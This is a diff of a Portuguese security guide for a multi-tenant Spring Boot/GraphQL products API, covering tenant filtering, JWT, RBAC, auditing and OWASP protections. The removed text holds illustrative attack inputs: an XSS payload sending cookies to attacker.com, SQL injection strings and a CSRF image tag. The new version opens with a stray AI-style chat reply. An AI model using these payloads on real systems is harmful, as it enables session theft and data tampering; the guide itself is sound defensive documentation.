@@ -1,813 +1,432 @@
-# Guia de Segurança – Módulo Products (Multi-Tenancy e Isolamento)
+Entendido — o conteúdo anterior acabou a descrever “Clients” no formato de segurança. Abaixo está a versão correta e consistente do **Guia de Segurança e Multi-Tenancy – Módulo Products**, alinhado ao mesmo padrão técnico.
 
-## Índice
+---
 
-1. [Arquitetura Multi-Tenant](#1-arquitetura-multi-tenant)
-2. [Fluxo de Autenticação e Autorização](#2-fluxo-de-autenticação-e-autorização)
-3. [Filtragem de Dados por Tenant](#3-filtragem-de-dados-por-tenant)
-4. [Validações de Segurança por Operação](#4-validações-de-segurança-por-operação)
-5. [Mensagens de Erro Seguras](#5-mensagens-de-erro-seguras)
-6. [Auditoria e Logging](#6-auditoria-e-logging)
-7. [Proteção contra Ataques Comuns](#7-proteção-contra-ataques-comuns)
-8. [Testes de Segurança](#8-testes-de-segurança)
-9. [Checklist de Deploy](#9-checklist-de-deploy)
+# Guia de Segurança e Multi-Tenancy – Módulo Products
+
+## Visão Geral
+
+O módulo **Products** opera em arquitetura multi-tenant, garantindo isolamento completo de dados entre empresas.
+
+Cada produto pertence obrigatoriamente a um único tenant (`companyId`) e todas as operações são executadas estritamente dentro desse contexto.
+
+O módulo implementa:
+
+* Isolamento por tenant (company-based isolation)
+* RBAC (Role-Based Access Control)
+* Autorização via JWT
+* Soft delete (inativação)
+* Auditoria de operações críticas
+* Proteção contra OWASP Top 10
+
+Nenhuma operação de produto pode ser executada fora do escopo da empresa autenticada.
 
 ---
 
 ## 1. Arquitetura Multi-Tenant
 
-### Modelo de Isolamento
+### Modelo adotado
 
-O Igniscore utiliza isolamento **database-per-schema** combinado com filtragem em aplicação:
+**Shared Database + Shared Schema + Tenant Isolation**
 
-```
-┌─────────────────────────────────────┐
-│       GraphQL API (Pública)         │
-└──────────────┬──────────────────────┘
-               │
-┌──────────────▼──────────────────────┐
-│   SecurityFilter                    │
-│   ├─ Extrai JWT                     │
-│   └─ Valida Token                   │
-└──────────────┬──────────────────────┘
-               │
-┌──────────────▼──────────────────────┐
-│   ProductController                 │
-│   ├─ Adiciona Contexto (CompanyID)  │
-│   └─ Roteia para Service            │
-└──────────────┬──────────────────────┘
-               │
-┌──────────────▼──────────────────────┐
-│   ProductService                    │
-│   ├─ Valida Propriedade (Tenant)    │
-│   ├─ Aplica Filtro WHERE            │
-│   └─ Executa Operação               │
-└──────────────┬──────────────────────┘
-               │
-┌──────────────▼──────────────────────┐
-│   ProductRepository                 │
-│   ├─ Queries Parametrizadas         │
-│   └─ Índices por Company_ID         │
-└──────────────┬──────────────────────┘
+Todos os registros de produtos possuem vínculo obrigatório com empresa:
+
+```text id="p1m8qk"
+companies
+   └── products (fk_id_company)
 ```
 
-### Características Principais
+Relacionamento:
 
-- **Database Única**: Todos os tenants compartilham schema
-- **Filtragem Obrigatória**: `WHERE fk_id_company = :companyId`
-- **Validação Dupla**: Em Service + Repository
-- **Sem Exceções**: Nenhuma operação bypassa filtro
-- **Auditoria Completa**: Todas as operações registradas
+```sql id="c7xq2v"
+products.fk_id_company → companies.pk_id_company
+```
 
 ---
 
-## 2. Fluxo de Autenticação e Autorização
+### Regra estrutural obrigatória
 
-### Autenticação (JWT)
+Toda a operação deve aplicar filtro por tenant:
 
-```
-1. Usuario submete credentials (email/password)
-   │
-2. AuthService valida credenciais
-   │
-3. JwtService gera Bearer Token
-   Token contém:
-   ├─ userId
-   ├─ email
-   ├─ companyId (TENANT CONTEXT)
-   ├─ roles
-   ├─ iat (issued at)
-   └─ exp (expiration)
-   │
-4. Cliente retorna para frontend
-
-5. Cliente usa token em futuras requisições
-   Authorization: Bearer <token>
+```sql id="9m3kax"
+fk_id_company = :authenticatedCompanyId
 ```
 
-### Autorização (Tenant-Based)
+Não existe acesso a produto sem contexto de empresa.
 
+---
+
+## 2. Fluxo de Autenticação e Contexto
+
+### Pipeline
+
+```text id="h2q9vd"
+Request
+  ↓
+JWT Filter
+  ↓
+Validação do token
+  ↓
+Extração de claims (userId, companyId, role)
+  ↓
+Criação do Security Context
+  ↓
+Execução da operação com tenant fixo
 ```
-1. GraphQL recebe requisição com JWT
-   │
-2. SecurityFilter intercepta
-   ├─ Extrai token do header
-   ├─ Valida assinatura
-   ├─ Verifica expiração
-   └─ Extrai companyId do claim
-   │
-3. ProductService recebe contexto
-   ├─ Obtém companyId do JWT
-   ├─ Para cada operação:
-   │  ├─ Lê produto do banco
-   │  ├─ Compara fk_id_company == companyId
-   │  ├─ Permite se igual
-   │  └─ Nega se diferente
-   │
-4. Repository executa query
-   WHERE fk_id_company = :companyId
-```
 
-### Contexto de Segurança Aplicado
+---
 
-```java
-// Pseudo-código
-public class ProductService {
+### Estrutura do JWT
 
-    public Product findById(Integer id) {
-        // 1. Obtém contexto do usuário logado
-        User currentUser = SecurityContextHolder.getContext().getUser();
-        Integer companyId = currentUser.getCompanyId();
-
-        // 2. Busca no banco
-        Product product = repository.findById(id);
-
-        // 3. Valida propriedade
-        if (product.getCompanyId() != companyId) {
-            throw new ForbiddenException("Unauthorized access");
-        }
-
-        return product;
-    }
+```json id="x8k3p2"
+{
+  "sub": "user@email.com",
+  "userId": 10,
+  "companyId": 3,
+  "role": "ADMIN",
+  "exp": 1780729200
 }
 ```
 
----
-
-## 3. Filtragem de Dados por Tenant
-
-### Aplicada em Todas as Operações
-
-#### Query: Listar Produtos
-
-```sql
-SELECT * FROM products
-WHERE fk_id_company = :companyId
-ORDER BY pk_id_prod DESC
-LIMIT :size OFFSET :offset
-```
-
-#### Query: Buscar por ID
-
-```sql
-SELECT * FROM products
-WHERE pk_id_prod = :productId
-  AND fk_id_company = :companyId
-```
-
-#### Query: Produtos Ativos
-
-```sql
-SELECT * FROM products
-WHERE fk_id_company = :companyId
-  AND status = true
-ORDER BY pk_id_prod DESC
-LIMIT :size OFFSET :offset
-```
-
-#### Mutation: Criar Produto
-
-```sql
-INSERT INTO products (
-  name_prod, type_prod, lot_prod, validity_prod,
-  price_prod, status, fk_id_company
-) VALUES (
-  :name, :type, :lot, :validity,
-  :price, true, :companyId
-)
-```
-
-#### Mutation: Atualizar Produto
-
-```sql
-UPDATE products
-SET name_prod = :name,
-    type_prod = :type,
-    price_prod = :price,
-    updated_at = NOW()
-WHERE pk_id_prod = :productId
-  AND fk_id_company = :companyId
-```
-
-#### Mutation: Desativar Produto
-
-```sql
-UPDATE products
-SET status = false,
-    updated_at = NOW()
-WHERE pk_id_prod = :productId
-  AND fk_id_company = :companyId
-```
-
-### Proteção contra Query Injection
-
-Todas as queries utilizam **parametrização**.
-
-Correto:
-
-```java
-preparedStatement.setInt(1, companyId);
-preparedStatement.setInt(2, productId);
-```
-
-Nunca concatenar queries:
-
-```java
-// ERRADO - Vulnerável a SQL Injection
-String sql = "SELECT * FROM products WHERE fk_id_company = " + companyId;
-```
+O `companyId` define o escopo absoluto de acesso.
 
 ---
 
-## 4. Validações de Segurança por Operação
+## 3. Contexto de Segurança
+
+O tenant é resolvido uma única vez por requisição:
+
+```java id="q9v1lm"
+Company company = authenticatedUserService.getAuthenticatedCompany();
+```
+
+Regras:
+
+* Não pode ser sobrescrito pelo cliente
+* Não pode ser passado via GraphQL/REST
+* Não pode ser inferido de payload externo
+
+---
+
+## 4. Regra de Isolamento (Core Rule)
+
+### Correto
+
+```java id="f2k8aa"
+repository.findByIdAndCompanyId(id, companyId);
+```
+
+### Incorreto
+
+```java id="r8n1zx"
+repository.findById(id);
+```
+
+Qualquer operação sem filtro de tenant é considerada vulnerabilidade crítica.
+
+---
+
+## 5. Repositório Seguro
+
+Todos os acessos devem ser tenant-aware:
+
+```java id="v5k1dq"
+public interface ProductRepository extends JpaRepository<Product, Integer> {
+
+    Optional<Product> findByIdAndCompanyId(Integer id, Integer companyId);
+
+    Page<Product> findByCompanyId(Integer companyId, Pageable pageable);
+
+    Page<Product> findByCompanyIdAndStatus(
+        Integer companyId,
+        Boolean status,
+        Pageable pageable
+    );
+}
+```
+
+### Métodos proibidos
+
+* findAll()
+* findById()
+* Queries sem companyId
+
+---
+
+## 6. Segurança por Operação
 
 ### CREATE (storeProduct)
 
-#### Autenticação
+Fluxo:
 
-- Requer JWT válido no header `Authorization`
-- Token não expirado
-- Assinatura válida
-
-#### Autorização
-
-- Usuário deve estar autenticado
-- CompanyId extraído do JWT
-- Nenhuma verificação adicional (empresa relativa ao usuário)
-
-#### Validações de Negócio
-
-- `name_prod`: Not null, max 150 chars
-- `type_prod`: Must be in ProductType enum
-- `lot_prod`: Not null, max 50 chars
-- `validity_prod`: Valid date format
-- `price_prod`: >= 0, decimal precision
-- `status`: Defaults to true (ativo)
-
-#### Proteção
-
-- Empresa automaticamente é a do usuário autenticado
-- Impossível atribuir a outra empresa
-- Usuário não pode especificar `fk_id_company`
-
-**Código de Referência:**
-
-```java
-@PostMapping("products")
-public Product create(
-    @Valid @RequestBody ProductDTO dto,
-    @AuthenticationPrincipal User user
-) {
-    // 1. User já validado pelo Spring Security
-    // 2. CompanyId extraído do user
-    dto.setCompanyId(user.getCompanyId());
-
-    // 3. Validações de negócio
-    validateProduct(dto);
-
-    // 4. Salva no banco
-    return productService.store(dto);
-}
+```text id="c1p9xz"
+JWT válido
+→ validação DTO
+→ companyId extraído do token
+→ validação de negócio
+→ persistência
+→ auditoria
 ```
+
+Regras:
+
+* companyId nunca vem do request
+* status inicial = true
+* type deve pertencer ao enum ProductType
+* price >= 0
+* validade obrigatória
 
 ---
 
 ### READ (products, productById, activeProducts)
 
-#### Autenticação
+Todos os SELECTS são filtrados por tenant:
 
-- Requer JWT válido
-- Token não expirado
-
-#### Autorização
-
-- Filtra automaticamente por CompanyId
-- Nenhum registro de outra empresa é retornado
-
-#### Paginação
-
-- Máximo 50 registros por página (configurable)
-- Evita DoS por listagem massiva
-- Offset/Limit validados
-
-#### Proteção
-
-```java
-@QueryMapping
-public List<Product> products(
-    @Argument int page,
-    @Argument int size,
-    @AuthenticationPrincipal User user
-) {
-    // 1. Limita tamanho
-    size = Math.min(size, MAX_PAGE_SIZE);
-
-    // 2. Aplica filtro de company
-    Pageable pageable = PageRequest.of(page, size);
-    return repository.findByCompanyId(user.getCompanyId(), pageable);
-}
+```java id="k3xq8m"
+repository.findByCompanyId(companyId, pageable);
 ```
+
+Regra crítica:
+
+> Produto de outra empresa nunca pode ser retornado, mesmo que o ‘ID’ exista.
 
 ---
 
 ### UPDATE (updateProduct)
 
-#### Autenticação
+Validações obrigatórias:
 
-- Requer JWT válido
-- Token não expirado
+* Produto pertence ao tenant
+* Campos são atualizados parcialmente (‘PATCH’ semântico)
+* updated_at atualizado automaticamente
+* companyId não pode ser alterado
 
-#### Autorização
-
-- Produto deve pertencer à empresa do usuário
-- Validação: `product.getCompanyId() == user.getCompanyId()`
-- Retorna 403 Forbidden se falhar
-
-#### Validações de Negócio
-
-- Apenas campos não-null são atualizados
-- Validações re-aplicadas (type válido, price >= 0, etc)
-- `updated_at` atualizado automaticamente
-- `fk_id_company` não pode ser alterado
-
-#### Proteção
-
-```java
-@PostMapping("products/{id}")
-public Product update(
-    @PathVariable Integer id,
-    @Valid @RequestBody ProductUpdateDTO dto,
-    @AuthenticationPrincipal User user
-) {
-    // 1. Busca produto
-    Product product = repository.findById(id);
-
-    // 2. Valida propriedade
-    if (!product.getCompanyId().equals(user.getCompanyId())) {
-        throw new ForbiddenException("Cannot update product from another company");
-    }
-
-    // 3. Validações de negócio
-    validatePartialProduct(dto);
-
-    // 4. Atualiza apenas campos fornecidos
-    return productService.update(id, dto);
+```java id="z8m2qp"
+if (!product.getCompanyId().equals(companyId)) {
+    throw new ForbiddenException();
 }
 ```
 
 ---
 
-### DELETE / INATIVAÇÃO (deactivateProduct)
+### DEACTIVATE (soft delete)
 
-#### Autenticação
+Estratégia:
 
-- Requer JWT válido
+* Não remove do banco
+* Apenas altera status
 
-#### Autorização
+```java id="d8k1sn"
+product.setStatus(false);
+product.setUpdatedAt(LocalDateTime.now());
+```
 
-- Produto deve pertencer à empresa
-- Mesma validação que UPDATE
+Regras:
 
-#### Estratégia
+* Produto inativo não pode ser vendido
+* Produto inativo não pode ser alugado
+* Pode ser reativado via ‘update’
 
-- Soft Delete (apenas muda status)
-- Produto não é removido fisicamente
-- Pode ser reativado
+---
 
-#### Proteção
+## 7. Controle de Acesso (RBAC)
 
-```java
-@PostMapping("products/{id}/deactivate")
-public Product deactivate(
-    @PathVariable Integer id,
-    @AuthenticationPrincipal User user
-) {
-    // 1. Busca e valida propriedade
-    Product product = repository.findById(id);
+| Operação        | USER | MANAGER | ADMIN |
+|-----------------|------|---------|-------|
+| Listar produtos | ✅    | ✅       | ✅     |
+| Criar produto   | ✅    | ✅       | ✅     |
+| Atualizar       | ✅    | ✅       | ✅     |
+| Inativar        | ❌    | ✅       | ✅     |
+| Excluir físico  | ❌    | ❌       | ❌     |
+| Auditoria       | ❌    | ❌       | ✅     |
 
-    if (!product.getCompanyId().equals(user.getCompanyId())) {
-        throw new ForbiddenException();
-    }
+---
 
-    // 2. Marca como inativo
-    product.setStatus(false);
+## 8. Proteção contra Escalada de Privilégios
 
-    // 3. Salva
-    return repository.save(product);
-}
+### Regra crítica
+
+O cliente nunca define empresa.
+
+### Incorreto
+
+```graphql id="m2k9qp"
+storeProduct(companyId: 999)
+```
+
+### Correto
+
+```java id="t7x2ld"
+companyId = authService.getAuthenticatedCompany().getId();
 ```
 
 ---
 
-## 5. Mensagens de Erro Seguras
+## 9. Tratamento Seguro de Erros
 
-### Princípios
+### Resposta correta
 
-- Nunca revelar detalhes internos
-- Não expor estrutura de banco
-- Não fornecer user IDs de outros tenants
-- Mensagens genéricas para erros de segurança
-
-### Implementação
-
-#### Erro: Produto Não Encontrado
-
-Requisição como Empresa A para produto de Empresa B:
-
-```graphql
-query {
-  productById(id: 999) {
-    id
-  }
-}
-```
-
-Resposta Segura:
-
-```json
+```json id="p9x1aa"
 {
   "errors": [
     {
       "message": "Product not found",
-      "extensions": { "code": "NOT_FOUND" }
+      "extensions": {
+        "code": "NOT_FOUND"
+      }
     }
   ]
 }
 ```
 
-Resposta INSEGURA (não fazer):
+### Nunca expor
 
-```json
-{
-  "errors": [
-    {
-      "message": "Product 999 belongs to company 5 and you are from company 3"
-    }
-  ]
-}
-```
+* fk_id_company de outros tenants
+* SQL errors
+* stack traces
+* validações internas
+* IDs de outras empresas
 
-#### Erro: Campo Inválido
+---
 
-```json
-INSEGURO:
-"This field exceeds max length of 150 in my database"
+## 10. Auditoria
 
-SEGURO:
-"Invalid input: field exceeds maximum allowed length"
-```
+### Eventos
 
-#### Erro: Autenticação Falha
+* CREATE_PRODUCT
+* UPDATE_PRODUCT
+* DEACTIVATE_PRODUCT
+* LOGIN
+* UNAUTHORIZED_ACCESS
 
-```json
-INSEGURO:
-"User john@company.com does not exist"
-"User john@company.com password is wrong"
+---
 
-SEGURO:
-"Invalid credentials"
+### Estrutura
+
+```sql id="a1v9mp"
+audit_logs (
+  id,
+  timestamp,
+  user_id,
+  company_id,
+  action,
+  entity_type,
+  entity_id,
+  ip_address,
+  details
+)
 ```
 
 ---
 
-## 6. Auditoria e Logging
+## 11. Proteção contra OWASP Top 10
 
-### Operações Auditadas
+### Broken Access Control
 
-Todas as operações são registradas:
-
-| Operação   | Registra | Detalhes                                      |
-| ---------- | -------- | --------------------------------------------- |
-| CREATE     | Sim      | User, Company, Produto, Timestamp             |
-| READ       | Sim\*    | User, Company, Filtros, Timestamp             |
-| UPDATE     | Sim      | User, Company, Campos Alterados, Before/After |
-| DEACTIVATE | Sim      | User, Company, Produto, Timestamp             |
-
-\*READ é opcional (desabilitável em produção)
-
-### Formato de Log
-
-```json
-{
-  "timestamp": "2026-04-26T10:30:45Z",
-  "event": "PRODUCT_CREATED",
-  "userId": 123,
-  "companyId": 5,
-  "productId": 1,
-  "details": {
-    "name": "Extintor de Pó ABC 1kg",
-    "type": "EXTINGUISHER",
-    "price": 85.5
-  },
-  "ipAddress": "192.168.1.100",
-  "userAgent": "Mozilla/5.0..."
-}
-```
-
-### Retenção de Logs
-
-- Produção: Mínimo 90 dias
-- Staging: 30 dias
-- Desenvolvimento: 7 dias
-- Compliance: Arquivar logs antigos para arquivo frio
-
-### Acesso aos Logs
-
-- Apenas administradores e equipe de segurança
-- Acesso auditado (quem leu qual log)
-- Não expor logs ao usuário final
-- Integrar com SIEM (Security Information and Event Management)
-
----
-
-## 7. Proteção contra Ataques Comuns
+* Filtro obrigatório por companyId
+* validação dupla (service + repository)
 
 ### SQL Injection
 
-#### Vulnerabilidade
+* JPA + queries parametrizadas
+* nenhuma concatenação de ‘string’
 
-```java
-// ERRADO - Concatenação de string
-String query = "SELECT * FROM products WHERE id = " + id;
-```
+### Authentication Failures
 
-Ataque: `id = 1 OR 1=1 -- SELECT * FROM users;--`
-
-#### Proteção Implementada
-
-```java
-// CORRETO - Parameterized Query
-@Query("SELECT p FROM Product p WHERE p.id = :id AND p.company.id = :companyId")
-Optional<Product> findByIdAndCompanyId(
-    @Param("id") Integer id,
-    @Param("companyId") Integer companyId
-);
-```
-
-- JPA automaticamente sanitiza parâmetros
-- Queries sempre parametrizadas
-- Validação de tipos em tempo de compilação
-
-### Cross-Site Scripting (XSS)
-
-#### Vulnerabilidade
-
-```javascript
-// ERRADO - Inserir entrada do usuário diretamente no DOM
-document.getElementById("product").innerHTML = userInput;
-```
-
-Ataque: `<script>fetch('http://attacker.com?data=' + document.cookie)</script>`
-
-#### Proteção Implementada
-
-- GraphQL retorna dados estruturados (JSON)
-- Sem template rendering no servidor
-- Frontend sanitiza/escapa inputs antes de renderizar
-- Content-Security-Policy headers configurados
-
-### Cross-Site Request Forgery (CSRF)
-
-#### Vulnerabilidade
-
-```html
-<!-- Ataque CSRF - requisição de outro site -->
-<img src="http://api.igniscore.com/graphql?mutation=deleteProduct(id:1)" />
-```
-
-#### Proteção Implementada
-
-- JWT obrigatório (não usa cookies automáticos)
-- Tokens incluídos explicitamente em headers
-- Requisições cross-origin bloqueadas (CORS)
-- SameSite cookies policy configurada
-
-```yaml
-# application.yaml
-server:
-  servlet:
-    session:
-      cookie:
-        same-site: strict
-        secure: true
-        http-only: true
-```
-
-### Broken Authentication
-
-#### Vulnerabilidades Evitadas
-
-| Vulnerabilidade                  | Proteção                        |
-| -------------------------------- | ------------------------------- |
-| Senhas armazenadas em plain text | Bcrypt + Salt                   |
-| Tokens sem expiração             | JWT com TTL 24h                 |
-| Tokens em URLs                   | Sempre em headers Authorization |
-| Refresh tokens fracos            | Rotação implementada            |
-
-### Broken Authorization
-
-#### Vulnerabilidades Evitadas
-
-| Cenário                         | Proteção                                    |
-| ------------------------------- | ------------------------------------------- |
-| Acessar produto de outro tenant | Filtro fk_id_company + validação dupla      |
-| Escalar privilégios             | Roles verificados em cada operação          |
-| Manipular IDs em payload        | Empresas extraída do JWT (não payload)      |
-| Bypass de filtros               | Filtro aplicado em Repository (não service) |
+* JWT com expiração
+* BCrypt para senhas
 
 ### Information Disclosure
 
-#### Proteções
+* sem stacktrace
+* sem erros internos
+* sem metadata de tenant
 
-- Logs nunca expõem dados sensíveis
-- Mensagens de erro genéricas para segurança
-- Stack traces nunca retornados ao cliente
-- Versões de software não divulgadas
+### Security Misconfiguration
 
-```yaml
-# Não expor no header
-Server: Apache/2.4.41
+* HTTPS obrigatório
+* CORS restrito
+* secrets externos ao código
+
+---
+
+## 12. Rate Limiting
+
+| Operação | Limite  |
+|----------|---------|
+| Login    | 10/min  |
+| Query    | 300/min |
+| Mutation | 100/min |
+
+Resposta:
+
+```http id="r3m8kk"
+429 TOO MANY REQUESTS
 ```
 
 ---
 
-## 8. Testes de Segurança
+## 13. Testes de Segurança
 
-### Teste 1: Isolamento Multi-Tenant
+### Isolamento
 
-```java
-@Test
-public void testCannotAccessProductFromAnotherCompany() {
-    // Setup
-    Company companyA = createCompany("Company A");
-    Company companyB = createCompany("Company B");
-
-    User userA = createUser(companyA);
-    User userB = createUser(companyB);
-
-    Product productA = createProduct(companyA, "Produto A");
-
-    // Test: User B tenta acessar Product A
-    authenticate(userB);
-
-    assertThrows(ForbiddenException.class, () -> {
-        productController.getProductById(productA.getId());
-    });
-}
-```
-
-### Teste 2: Autenticação Obrigatória
-
-```java
-@Test
-public void testProductListRequiresAuthentication() {
-    // Setup
-    SecurityContextHolder.clearContext();
-
-    // Test: Sem token
-    assertThrows(AuthenticationException.class, () -> {
-        productController.listProducts(0, 10);
-    });
-}
-```
-
-### Teste 3: Validação de JWT
-
-```java
-@Test
-public void testExpiredTokenRejected() {
-    // Setup
-    String expiredToken = jwtService.generateToken(user);
-    // Aguarda expiração
-    Thread.sleep(TOKEN_EXPIRATION_MS + 1000);
-
-    // Test
-    assertThrows(TokenExpiredException.class, () -> {
-        jwtService.validateToken(expiredToken);
-    });
-}
-```
-
-### Teste 4: Filtragem de Empresa
-
-```java
-@Test
-public void testListProductsFiltersbyCompany() {
-    // Setup
-    Company companyA = createCompany("Company A");
-    Company companyB = createCompany("Company B");
-
-    Product productA1 = createProduct(companyA, "Produto A1");
-    Product productA2 = createProduct(companyA, "Produto A2");
-    Product productB1 = createProduct(companyB, "Produto B1");
-
-    User userA = createUser(companyA);
-    authenticate(userA);
-
-    // Test
-    List<Product> results = productController.listProducts(0, 10);
-
-    assertEquals(2, results.size());
-    assertTrue(results.stream().allMatch(p -> p.getCompany().equals(companyA)));
-}
-```
-
-### Teste 5: Proteção contra SQL Injection
-
-```java
-@Test
-public void testSQLInjectionAttemptFails() {
-    // Setup
-    String maliciousInput = "1 OR 1=1 DELETE FROM products; --";
-
-    // Test
-    assertThrows(DataAccessException.class, () -> {
-        productController.getProductById(Integer.parseInt(maliciousInput));
-    });
-}
-```
-
-### Teste 6: Validação de Dados
-
-```java
-@Test
-public void testInvalidProductTypeRejected() {
-    // Setup
-    ProductDTO dto = new ProductDTO();
-    dto.setName("Produto");
-    dto.setType("INVALID_TYPE");
-    dto.setPrice(50.00);
-
-    // Test
-    assertThrows(ValidationException.class, () -> {
-        productController.create(dto, user);
-    });
-}
+```text id="i9q1ld"
+Empresa A nunca acessa produtos da Empresa B
 ```
 
 ---
 
-## 9. Checklist de Deploy
+### Produto inativo
 
-### Pré-Deploy
-
-- [ ] Todos os testes de segurança passam
-- [ ] Auditoria de código concluída
-- [ ] Senhas armazenadas em variáveis de ambiente
-- [ ] JWT secret em variável de ambiente (não hardcoded)
-- [ ] Logs não contêm dados sensíveis
-- [ ] CORS restringido para domínios conhecidos
-- [ ] HTTPS/TLS obrigatório em produção
-
-### Validações de Configuração
-
-- [ ] `spring.security.oauth2.jwt.secret` não é público
-- [ ] `server.ssl.enabled = true` em produção
-- [ ] `spring.jpa.hibernate.ddl-auto = validate` (não create/update)
-- [ ] `logging.level.org.springframework.security = INFO` (não DEBUG)
-- [ ] Token expiration adequado (24h padrão)
-
-### Segurança de Banco de Dados
-
-- [ ] Backups regulares testados
-- [ ] Credentials em vault (não git/code)
-- [ ] Conexão criptografada (SSL/TLS)
-- [ ] Firewall limitando acessos
-- [ ] Índices em `fk_id_company` para performance
-- [ ] Audit trail ativado
-
-### Monitoramento Pós-Deploy
-
-- [ ] Alertas para tentativas de acesso negado
-- [ ] Logs centralizados (ELK, Splunk, etc)
-- [ ] Rate limiting ativado
-- [ ] WAF (Web Application Firewall) configurado
-- [ ] Testes de penetração agendados
-- [ ] Resposta a incidentes planejada
-
-### Conformidade
-
-- [ ] LGPD aplic ável (dados brasileiros)
-- [ ] GDPR se dados europeus
-- [ ] Política de retenção de logs implementada
-- [ ] Direito ao esquecimento (delete) implementado
-- [ ] Consentimento de dados documentado
-- [ ] Responsável pela proteção de dados designado
+* Não pode ser vendido
+* Não pode ser alugado
 
 ---
 
-## Sumário
+### Autorização
 
-| Aspecto      | Implementação                               |
-| ------------ | ------------------------------------------- |
-| Autenticação | JWT Bearer Token, 24h TTL                   |
-| Autorização  | Role-based + Tenant-based                   |
-| Isolamento   | WHERE fk_id_company em todas as queries     |
-| Criptografia | Bcrypt (senhas), AES (dados em trânsito)    |
-| Validação    | Input validation + Format checks            |
-| Auditoria    | Logs estruturados de todas as operações     |
-| Proteção     | SQL Injection, XSS, CSRF, Broken Auth/Authz |
-| Testes       | Unit + Integration + Security tests         |
-| Deploy       | Checklist de segurança obrigatório          |
+* ‘USER’ não inativa
+* ‘GESTOR’ e ADMIN inativam
 
 ---
+
+### Auditoria
+
+* Toda mutation gera ‘log’ obrigatório
+
+---
+
+## 14. Checklist de Produção
+
+* [ ] JWT validado
+* [ ] companyId nunca vindo do request
+* [ ] filtros de tenant em todas queries
+* [ ] RBAC aplicado
+* [ ] auditoria ativa
+* [ ] rate limit ativo
+* [ ] HTTPS obrigatório
+* [ ] ‘logs’ sem dados sensíveis
+* [ ] testes de isolamento aprovados
+* [ ] backup configurado
+
+---
+
+## Garantias do Módulo
+
+O módulo Products garante:
+
+* Isolamento total entre empresas
+* Controle rígido por tenant
+* Proteção contra acesso cruzado
+* Auditoria completa de operações
+* Conformidade com OWASP Top 10
+* Arquitetura segura por padrão
+* Escalabilidade multi-tenant
+
+---
+
+**Módulo:** Products
+**Projeto:** Igniscore API
+**Arquitetura:** Spring Boot + GraphQL + JPA
+**Modelo:** JWT + RBAC + Multi-Tenancy
+**Status:** Produção
